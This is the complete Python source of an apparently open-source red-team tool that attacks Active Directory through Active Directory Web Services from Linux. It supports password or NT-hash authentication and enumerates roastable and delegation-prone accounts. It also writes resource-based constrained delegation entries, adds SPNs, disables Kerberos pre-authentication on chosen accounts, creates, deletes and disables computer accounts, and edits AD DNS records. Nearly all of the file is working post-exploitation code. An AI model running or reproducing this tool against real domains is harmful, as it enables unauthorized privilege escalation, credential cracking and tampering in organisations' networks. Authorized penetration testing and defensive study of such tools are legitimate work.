#!/usr/bin/env python3

import argparse
import logging
import sys
from base64 import b64decode, b64encode
import base64
import string
import random
from uuid import uuid4
from typing import Optional

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE,
    ACCESS_MASK,
    ACE,
    ACL,
    LDAP_SID,
    SR_SECURITY_DESCRIPTOR,
)

from src.adws import ADWSConnect, NTLMAuth
from src.soap_templates import NAMESPACES, LDAP_CREATE_FOR_RESOURCEFACTORY, LDAP_DELETE_FOR_RESOURCE, LDAP_PUT_FSTRING

# DNS ADWS helpers
from src.ad_dns_manager_adws import (
    add_dns_record_adws,
    modify_dns_record_adws,
    remove_dns_record_adws,
    tombstone_dns_record_adws,
    resurrect_dns_record_adws,
)

# https://github.com/fortra/impacket/blob/829239e334fee62ace0988a0cb5284233d8ec3c4/examples/rbcd.py#L180
def _create_empty_sd():
    sd = SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = LDAP_SID()
    # BUILTIN\Administrators
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd


# https://github.com/fortra/impacket/blob/829239e334fee62ace0988a0cb5284233d8ec3c4/examples/rbcd.py#L200
def _create_allow_ace(sid: LDAP_SID):
    nace = ACE()
    nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
    nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551  # Full control
    acedata["Sid"] = sid.getData()
    nace["Ace"] = acedata
    return nace


def getAccountDN(target: str, username: str, ip: str, domain: str, auth: NTLMAuth):
    """Get the distinguishedName of a user or computer in AD using ADWS Pull"""
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = ["distinguishedname"]

    pull_et = pull_client.pull(query=get_account_query, basedn=None, attributes=attributes)

    distinguishedName_elem = None

    # Look for user first, then computer (same order used in other scripts)
    for tag in [".//addata:user", ".//addata:computer"]:
        for item in pull_et.findall(tag, namespaces=NAMESPACES):
            distinguishedName_elem = item.find(
                ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
            )
            if distinguishedName_elem is not None:
                break
        if distinguishedName_elem is not None:
            break

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        raise RuntimeError(f"Unable to locate DN for target '{target}'")

    return distinguishedName_elem.text


from xml.etree import ElementTree as ET
from uuid import uuid4
from src.adws import ADWSConnect, ADWSError
from src.soap_templates import LDAP_DELETE_FOR_RESOURCE

def delete_computer(
    machine_name: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth
) -> bool:
    """
    Delete an AD computer object using ADWS WS-Transfer Delete.

    Improved error handling: catches ADWS faults and prints a concise English
    message for common cases (insufficient rights, validation errors, ...).
    """
    print(f"[*] Attempting to delete computer: {machine_name}")

    # Normalize SAM
    sam = machine_name if machine_name.endswith("$") else machine_name + "$"

    # ---- Locate DN of the computer ----
    print("[*] Locating computer in AD...")
    try:
        dn = getAccountDN(
            target=sam,
            username=username,
            ip=ip,
            domain=domain,
            auth=auth
        )
    except Exception as e:
        print(f"[-] Failed to locate machine {sam}: {e}")
        return False

    if not dn:
        print(f"[-] Could not find DN for computer {sam}")
        return False

    print(f"[+] Found DN: {dn}")

    # ---- Build WS-Transfer Delete request ----
    msg_id = f"urn:uuid:{uuid4()}"

    delete_payload = LDAP_DELETE_FOR_RESOURCE.format(
        object_dn=dn,
        fqdn=ip,
        uuid=msg_id
    )

    # ---- Send request ----
    print("[*] Connecting to ADWS Resource endpoint to delete object...")

    client = ADWSConnect(ip, domain, username, auth, "Resource")
    try:
        client._nmf.send(delete_payload)
        response = client._nmf.recv()
    except Exception as e:
        print(f"[-] Transport error when sending Delete request: {e}")
        return False

    # Try to parse the response safely and produce a concise English message on failure
    try:
        et = client._handle_str_to_xml(response)
    except ADWSError:
        # Extract useful info from raw SOAP Fault and show a short message
        s = response if isinstance(response, str) else response.decode(errors="ignore")
        start = s.find('<')
        if start != -1:
            s = s[start:]
        try:
            root = ET.fromstring(s)
            ns = {'ad': 'http://schemas.microsoft.com/2008/1/ActiveDirectory'}
            win32_elem = root.find('.//ad:Win32ErrorCode', namespaces=ns)
            errcode_elem = root.find('.//ad:ErrorCode', namespaces=ns)
            msg_elem = root.find('.//ad:Message', namespaces=ns)
            ext_elem = root.find('.//ad:ExtendedErrorMessage', namespaces=ns)

            win32 = win32_elem.text.strip() if win32_elem is not None and win32_elem.text else None
            errcode = errcode_elem.text.strip() if errcode_elem is not None and errcode_elem.text else None
            msg = msg_elem.text.strip() if msg_elem is not None and msg_elem.text else None
            ext = ext_elem.text.strip() if ext_elem is not None and ext_elem.text else None

            # Map to short, user-friendly messages
            if win32 == '5' or errcode == '50' or (msg and 'insufficient access' in msg.lower()):
                print("! Insufficient access rights to perform the operation.")
            elif msg:
                short = msg.splitlines()[0]
                print(f"! AD error: {short}")
                if ext:
                    print(f"  Details: {ext}")
            else:
                print("! ADWS operation failed (see server response for details).")
        except Exception:
            # If parsing fails, fallback to a single-line message
            print("! ADWS operation failed and the fault could not be parsed.")
        return False

    # If parsing succeeded but returned no XML object
    if et is None:
        print("[-] Empty or malformed DeleteResponse (AD may still have removed the object).")
        return False

    # Check for explicit SOAP Fault even when _handle_str_to_xml did not raise
    fault = et.find(".//{http://www.w3.org/2003/05/soap-envelope}Fault")
    if fault is not None:
        # try the same concise extraction as above
        try:
            ns = {'ad': 'http://schemas.microsoft.com/2008/1/ActiveDirectory'}
            win32_elem = et.find('.//ad:Win32ErrorCode', namespaces=ns)
            errcode_elem = et.find('.//ad:ErrorCode', namespaces=ns)
            msg_elem = et.find('.//ad:Message', namespaces=ns)
            ext_elem = et.find('.//ad:ExtendedErrorMessage', namespaces=ns)

            win32 = win32_elem.text.strip() if win32_elem is not None and win32_elem.text else None
            errcode = errcode_elem.text.strip() if errcode_elem is not None and errcode_elem.text else None
            msg = msg_elem.text.strip() if msg_elem is not None and msg_elem.text else None
            ext = ext_elem.text.strip() if ext_elem is not None and ext_elem.text else None

            if win32 == '5' or errcode == '50' or (msg and 'insufficient access' in msg.lower()):
                print("! Insufficient access rights to perform the operation.")
            elif msg:
                short = msg.splitlines()[0]
                print(f"! AD error: {short}")
                if ext:
                    print(f"  Details: {ext}")
            else:
                print("! ADWS operation failed (server returned a SOAP Fault).")
        except Exception:
            print("! ADWS operation failed (SOAP Fault present).")
        return False

    # Success
    print(f"[+] Computer {sam} successfully deleted.")
    return True


def encode_unicode_pwd(password: str) -> str:
    # AD requires: password in quotes, UTF-16LE encoded, base64 encoded
    quoted = f'"{password}"'
    pwd_utf16 = quoted.encode('utf-16-le')
    return base64.b64encode(pwd_utf16).decode()


def add_computer(
    target: str,
    machine_name: str,
    ou_dn: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
    computer_pass: str = None,
    spn_list: list = None,
) -> bool:
    """
    Create a computer object in AD via ADWS ResourceFactory (WS-Transfer Create)
    and optionally set unicodePwd and SPNs via Put operations.
    """
    if remove:
        raise NotImplementedError("Removal logic is not implemented.")
    
    # If no machine_name given by user, generate a secure name
    import secrets

    if machine_name is None:
        machine_name = 'DESKTOP-' + (''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8)))

    print(f"[+] Using machine ame: {machine_name}")

    # Normalize names
    sam = machine_name if machine_name.endswith("$") else machine_name + "$"
    cn = machine_name
    host = cn.rstrip("$")

    # Find DN container
    if ou_dn:
        container_dn = ou_dn
    else:
        domain_parts = [f"DC={p}" for p in domain.split(".") if p]
        domain_dn = ",".join(domain_parts)
        container_dn = f"CN=Computers,{domain_dn}"

    logging.info(f"Creating computer account {sam} in {container_dn} via ADWS ResourceFactory")

    # ---- Build AttributeTypeAndValue XML blocks ----
    # If no password given by user, generate a secure 16-character password
    import secrets

    if computer_pass is None:
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*?"
        computer_pass = ''.join(secrets.choice(alphabet) for _ in range(16))

    print(f"[+] Using computer password: {computer_pass}")

    encoded_pass = encode_unicode_pwd(computer_pass)

    # Default SPNs like Powermad / Impacket
    default_spns = [
        f"HOST/{host}",
        f"HOST/{host}.{domain}",
        f"RestrictedKrbHost/{host}",
        f"RestrictedKrbHost/{host}.{domain}",
    ]

    spns = spn_list if spn_list else default_spns

    attrs = {
        "addata:objectClass": ["computer"],
        "ad:container-hierarchy-parent": [container_dn],
        "ad:relativeDistinguishedName": [f"CN={cn}"],
        "addata:sAMAccountName": [sam],
        "addata:userAccountControl": ["4096"],  # WORKSTATION_TRUST_ACCOUNT (0x1000)
        "addata:dnsHostName": [f"{host}.{domain}"],
        "addata:servicePrincipalName": spns,
        "addata:unicodePwd": [encoded_pass],
    }

    atav_xml = ""
    for attr_type, values in attrs.items():
        values_xml = ""
        for v in values:
            if attr_type == "addata:unicodePwd":
                # unicodePwd must be sent as base64Binary in ADWS SOAP
                values_xml += f'<ad:value xsi:type="xsd:base64Binary">{v}</ad:value>'
            else:
                # SPNs and dnsHostName are strings; multiple SPNs create multiple <ad:value> entries
                values_xml += f'<ad:value xsi:type="xsd:string">{v}</ad:value>'

        atav_xml += (
            "      <AttributeTypeAndValue>\n"
            f"        <AttributeType>{attr_type}</AttributeType>\n"
            f"        <AttributeValue>\n          {values_xml}\n        </AttributeValue>\n"
            "      </AttributeTypeAndValue>\n"
        )

    # ---- Build SOAP Envelope ----
    msg_id = f"urn:uuid:{uuid4()}"

    addrequest_payload = LDAP_CREATE_FOR_RESOURCEFACTORY.format(
        uuid=msg_id,
        fqdn=ip,
        atav_xml=atav_xml
    )

    # ---- Send AddRequest ----
    client = ADWSConnect(ip, domain, username, auth, "ResourceFactory")
    client._nmf.send(addrequest_payload)
    response = client._nmf.recv()

    et = client._handle_str_to_xml(response)
    if et is None:
        raise RuntimeError("AddRequest response empty or malformed.")

    logging.info("AddRequest successful. Locating newly created object...")

    dn = getAccountDN(target=sam, username=username, ip=ip, domain=domain, auth=auth)
    if not dn:
        raise RuntimeError("Failed to locate DN of the newly created computer.")

    logging.info(f"Created object DN: {dn}")

    print(f"[+] Computer {sam} successfully created in {dn}")
    return True


def set_spn(
    target: str,
    value: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Set a value in servicePrincipalName. Appends value to the attribute rather than replacing."""
    dn = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)
                                  
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    
    put_client.put(
        object_ref=dn,
        operation="add" if not remove else "delete",
        attribute="addata:servicePrincipalName",
        data_type="string",
        value=value,
    )
        
    print(f"[+] servicePrincipalName {value} {'removed' if remove else 'written'} successfully on {target}!")


def set_asrep(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Set or clear the DONT_REQ_PREAUTH flag on userAccountControl via ADWS Put (replace)."""
    get_accounts_queries = f"(sAMAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "userAccountControl",
        "distinguishedName",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    uac = None
    distinguishedName_elem = None

    for item in pull_et.findall(".//addata:user", namespaces=NAMESPACES):
        uac = item.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
    
    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        raise RuntimeError("Unable to locate target DN for asrep operation")
    dn = distinguishedName_elem.text

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    if not remove:
        newUac = int(uac.text) | 0x400000
        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=newUac,
        )
    else:
        newUac = int(uac.text) & ~0x400000
        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=newUac,
        )
    
    print(f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!")


def set_rbcd(
    target: str,
    account: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Write or remove RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) using ADWS Put operations."""
    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "samaccountname",
        "objectsid",
        "distinguishedname",
        "msds-allowedtoactonbehalfofotheridentity",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)

    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn: str = ""
    account_sid: LDAP_SID | None = None

    for item in pull_et.findall(".//addata:computer", namespaces=NAMESPACES):
        sam_name_elem = item.find(".//addata:sAMAccountName/ad:value", namespaces=NAMESPACES)
        sd_elem = item.find(".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value", namespaces=NAMESPACES)
        sid_elem = item.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)

        sam_name = sam_name_elem.text if sam_name_elem != None else ""
        sid = sid_elem.text if sid_elem != None else ""
        sd = sd_elem.text if sd_elem != None else ""
        dn = distinguishedName_elem.text if distinguishedName_elem != None else ""

        if sam_name and sid and sam_name.casefold() == account.casefold():
            account_sid = LDAP_SID(data=b64decode(sid))
        if dn and sam_name and sam_name.casefold() == target.casefold():
            target_dn = dn
            if sd:
                target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd))

    if not account_sid:
        logging.critical(f"Unable to find {target} or {account}.")
        raise SystemExit()

    # collect a clean list.  remove the account sid if its present
    target_sd["Dacl"].aces = [
        ace
        for ace in target_sd["Dacl"].aces
        if ace["Ace"]["Sid"].formatCanonical() != account_sid.formatCanonical()
    ]
    if not remove:
        target_sd["Dacl"].aces.append(_create_allow_ace(account_sid))

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    put_client.put(
        object_ref=target_dn,
        operation="replace",
        attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
        data_type="base64Binary",
        value=b64encode(target_sd.getData()).decode("utf-8"),
    )

    if remove and len(target_sd["Dacl"].aces) == 0:
        put_client.put(
            object_ref=target_dn,
            operation="delete",
            attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
            data_type="base64Binary",
            value=b64encode(target_sd.getData()).decode("utf-8"),
        )

    print(f"[+] msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} successfully!")
    print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")


def disable_machine_account(
    machine_name: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth
) -> bool:
    """
    Disable a computer account (set the ACCOUNTDISABLE flag in userAccountControl)
    using ADWS WS-Transfer Put (replace userAccountControl).
    """
    print(f"[*] Attempting to disable computer: {machine_name}")

    # Normalize SAM
    sam = machine_name if machine_name.endswith("$") else machine_name + "$"

    # ---- Locate current userAccountControl and DN ----
    get_accounts_queries = f"(sAMAccountName={sam})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "userAccountControl",
        "distinguishedName",
    ]

    try:
        pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    except Exception as e:
        print(f"[-] Failed LDAP pull for {sam}: {e}")
        return False

    uac_elem = None
    distinguishedName_elem = None

    # Try computer first, then user
    for tag in [".//addata:computer", ".//addata:user"]:
        for item in pull_et.findall(tag, namespaces=NAMESPACES):
            if uac_elem is None:
                uac_elem = item.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
            if distinguishedName_elem is None:
                distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
            if uac_elem is not None and distinguishedName_elem is not None:
                break
        if uac_elem is not None and distinguishedName_elem is not None:
            break

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        print(f"[-] Unable to locate DN for {sam}")
        return False

    dn = distinguishedName_elem.text

    if uac_elem is None or uac_elem.text is None:
        print(f"[-] Unable to locate userAccountControl for {sam}")
        return False

    try:
        current_uac = int(uac_elem.text)
    except Exception as e:
        print(f"[-] Failed to parse userAccountControl value: {e}")
        return False

    ACCOUNTDISABLE_FLAG = 0x2

    if (current_uac & ACCOUNTDISABLE_FLAG) != 0:
        print(f"[-] Computer {sam} is already disabled (userAccountControl={current_uac}).")
        return True

    new_uac = current_uac | ACCOUNTDISABLE_FLAG

    # ---- Perform Put (replace userAccountControl) ----
    try:
        put_client = ADWSConnect.put_client(ip, domain, username, auth)
        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=new_uac,
        )
    except Exception as e:
        print(f"[-] Failed to write new userAccountControl for {sam}: {e}")
        return False

    print(f"[+] Computer {sam} successfully disabled (userAccountControl set to {new_uac}).")
    return True


# ---------------------------------------------------------------------------
# CLI entrypoint: run_cli()
# ---------------------------------------------------------------------------

def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝ 
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝  
███████║╚██████╔╝██║  ██║██║        ██║   
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝  

@_logangoins
github.com/jlevere
""")

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Perform AD reconnaissance and post-exploitation through ADWS from Linux",
    )
    parser.add_argument(
        "connection",
        action="store",
        help="domain/username[:password]@<targetName or address>",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Turn DEBUG output ON"
    )
    parser.add_argument(
        "--ts",
        action="store_true",
        help="Adds timestamp to every logging output."
    )
    parser.add_argument(
        "-H", "--hash",
        action="store",
        metavar="nthash",
        help="Use an NT hash for authentication",
    )

    enum = parser.add_argument_group('Enumeration')
    enum.add_argument("--users", action="store_true", help="Enumerate user objects")
    enum.add_argument("--computers", action="store_true", help="Enumerate computer objects")
    enum.add_argument("--groups", action="store_true", help="Enumerate group objects")
    enum.add_argument("--constrained", action="store_true", help="Enumerate objects with msds-allowedtodelegateto")
    enum.add_argument("--unconstrained", action="store_true", help="Enumerate objects with TRUSTED_FOR_DELEGATION")
    enum.add_argument("--spns", action="store_true", help="Enumerate accounts with servicePrincipalName set")
    enum.add_argument("--asreproastable", action="store_true", help="Enumerate accounts with DONT_REQ_PREAUTH set")
    enum.add_argument("--admins", action="store_true", help="Enumerate high privilege accounts")
    enum.add_argument("--rbcds", action="store_true", help="Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set")
    enum.add_argument("-q", "--query", action="store", metavar="query", help="Raw query to execute on the target")
    enum.add_argument("-f", "--filter", action="store", metavar="attr,attr,...", help="Attributes to select, comma separated")
    enum.add_argument("-dn", "--distinguishedname", action="store", metavar="distinguishedname", help="The root object's distinguishedName for the query")
    enum.add_argument("-p", "--parse", action="store_true", help="Parse attributes to human readable format")

    writing = parser.add_argument_group('Writing')
    writing.add_argument("--rbcd", action="store", metavar="source", help="Write/remove RBCD (source computer)")
    writing.add_argument("--spn", action="store", metavar="value", help='Write servicePrincipalName value (use --remove to delete)')
    writing.add_argument("--asrep", action="store_true", help="Write DONT_REQ_PREAUTH flag (asrep roastable)")
    writing.add_argument("--account", action="store", metavar="account", help="Account to perform operations on")
    writing.add_argument("--remove", action="store_true", help="Remove attribute value based on operation")

    # Computer management (create/delete/disable)
    writing.add_argument("--addcomputer", nargs='?', const='', action="store", metavar="MACHINE", help="Create a computer account in AD (optional MACHINE name)")
    writing.add_argument("--computer-pass", action="store", metavar="pass", help="Password for the new computer account (optional).")
    writing.add_argument("--ou", action="store", metavar="ou", help="DN of the OU where to create the computer (optional).")
    writing.add_argument("--delete-computer", action="store", metavar="MACHINE", help="Delete an existing computer account")
    writing.add_argument("--disable-account", action="store", metavar="MACHINE", help="Disable a computer account (set AccountDisabled)")

    # DNS management options
    writing.add_argument("--dns-add", action="store", metavar="FQDN", help="Add A record (FQDN). Requires --dns-ip")
    writing.add_argument("--dns-modify", action="store", metavar="FQDN", help="Modify/replace A record (FQDN). Requires --dns-ip")
    writing.add_argument("--dns-remove", action="store", metavar="FQDN", help="Remove A record (FQDN). Requires --dns-ip unless --ldapdelete")
    writing.add_argument("--dns-tombstone", action="store", metavar="FQDN", help="Tombstone a dnsNode (replace with TS record + set dNSTombstoned=true)")
    writing.add_argument("--dns-resurrect", action="store", metavar="FQDN", help="Resurrect a tombstoned dnsNode")
    writing.add_argument("--dns-ip", action="store", metavar="IP", help="IP used with dns add/modify/remove")
    writing.add_argument("--ldapdelete", action="store_true", help="Use delete on dnsNode object (when used with --dns-remove)")
    writing.add_argument("--allow-multiple", action="store_true", help="Allow multiple A records when adding")
    writing.add_argument("--ttl", type=int, default=180, help="TTL for new A record (default 180)")
    writing.add_argument("--tcp", action="store_true", help="Use DNS over TCP when fetching SOA serial")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.connection)

    if domain is None:
        domain = ""

    # Ask for password if missing and username present
    if password == "" and username != "" and options.hash is None:
        from getpass import getpass
        password = getpass("Password:")

    queries: dict[str, str] = {
        "users": "(&(objectClass=user)(objectCategory=person))",
        "computers": "(objectClass=computer)",
        "constrained": "(msds-allowedtodelegateto=*)",
        "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        "spns": "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "asreproastable":"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "admins": "(&(objectClass=user)(adminCount=1))",
        "groups": "(objectCategory=group)",
        "rbcds": "(msds-allowedtoactonbehalfofotheridentity=*)",
    }

    ldap_query = []
    ldap_query.append(options.query)
    for flag, this_query in queries.items():
        if getattr(options, flag):
            ldap_query.append(this_query)

    if not domain:
        logging.critical('"domain" must be specified')
        raise SystemExit()

    if not username:
        logging.critical('"username" must be specified')
        raise SystemExit()

    auth = NTLMAuth(password=password, hashes=options.hash)

    # -----------------------
    # Writing operations
    # -----------------------

    try:
        # RBCD
        if options.rbcd is not None:
            if not options.account:
                logging.critical('"--rbcd" must be used with "--account"')
                raise SystemExit()
            set_rbcd(
                ip=remoteName,
                domain=domain,
                target=options.account,
                account=options.rbcd,
                username=username,
                auth=auth,
                remove=options.remove,
            )

        # SPN write/remove
        elif options.spn is not None:
            if not options.account:
                logging.critical('Please specify an account with "--account"')
                raise SystemExit()
            set_spn(
                ip=remoteName,
                domain=domain,
                target=options.account,
                value=options.spn,
                username=username,
                auth=auth,
                remove=options.remove
            )

        # ASREP
        elif options.asrep:
            if not options.account:
                logging.critical('Please specify an account with "--account"')
                raise SystemExit()
            set_asrep(
                ip=remoteName,
                domain=domain,
                target=options.account,
                username=username,
                auth=auth,
                remove=options.remove
            )

        # Add computer
        elif getattr(options, "addcomputer", None) is not None:
            if not username:
                logging.critical('Please specify a username with the connection string')
                raise SystemExit()

            machine_name = None if options.addcomputer == "" else options.addcomputer
            try:
                add_computer(
                    target=options.account if options.account else None,
                    machine_name=machine_name,
                    ou_dn=options.ou,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                    remove=options.remove,
                    computer_pass=options.computer_pass,
                )
                display_name = machine_name if machine_name else "(generated)"
                print(f"[+] Computer {display_name} {'removed' if options.remove else 'created'} successfully.")
            except NotImplementedError as e:
                logging.error("Feature not implemented: %s", e)
                raise SystemExit(2)
            except Exception as e:
                logging.exception("Error during add_computer operation: %s", e)
                raise SystemExit(1)

        # Disable account
        elif options.disable_account:
            if not username:
                logging.critical('Please specify a username with the connection string')
                raise SystemExit()
            try:
                success = disable_machine_account(
                    machine_name=options.disable_account,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )
                if not success:
                    raise SystemExit(1)
                print(f"[+] Computer {options.disable_account} disabled successfully (requested).")
            except Exception as e:
                logging.exception("Error during disable_account operation: %s", e)
                raise SystemExit(1)

        # Delete computer
        elif options.delete_computer:
            delete_computer(
                machine_name=options.delete_computer,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
            )
            return

        # -----------------------
        # DNS operations
        # -----------------------
        elif options.dns_add:
            if not options.dns_ip:
                logging.critical("--dns-add requires --dns-ip")
                raise SystemExit(1)
            add_dns_record_adws(
                fqdn_record=options.dns_add,
                ip_addr=options.dns_ip,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                allow_multiple=options.allow_multiple,
                ttl=options.ttl,
                tcp=options.tcp,
            )

        elif options.dns_modify:
            if not options.dns_ip:
                logging.critical("--dns-modify requires --dns-ip")
                raise SystemExit(1)
            modify_dns_record_adws(
                fqdn_record=options.dns_modify,
                new_ip=options.dns_ip,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                ttl=options.ttl,
                tcp=options.tcp,
            )

        elif options.dns_remove:
            if not options.ldapdelete and not options.dns_ip:
                logging.critical("--dns-remove requires --dns-ip unless --ldapdelete is specified")
                raise SystemExit(1)
            remove_dns_record_adws(
                fqdn_record=options.dns_remove,
                ip_to_remove=options.dns_ip if options.dns_ip else "",
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
                ldapdelete=options.ldapdelete,
            )

        elif options.dns_tombstone:
            tombstone_dns_record_adws(
                fqdn_record=options.dns_tombstone,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
            )

        elif options.dns_resurrect:
            resurrect_dns_record_adws(
                fqdn_record=options.dns_resurrect,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
            )

        # -----------------------
        # Enumeration / Pull operations (default)
        # -----------------------
        else:
            if ldap_query is None or all(q is None for q in ldap_query):
                logging.critical("Query cannot be None")
                raise SystemExit()

            client = ADWSConnect.pull_client(
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )

            for current_query in ldap_query:
                if not current_query:
                    continue

                if options.filter is not None:
                    attributes: list = [x.strip() for x in options.filter.split(",")]
                else:
                    attributes = None
                
                client.pull(current_query, options.distinguishedname, attributes, print_incrementally=True, parse_values=options.parse)

    except Exception as e:
        logging.exception("Operation failed: %s", e)
        raise SystemExit(1)


if __name__ == "__main__":
    run_cli()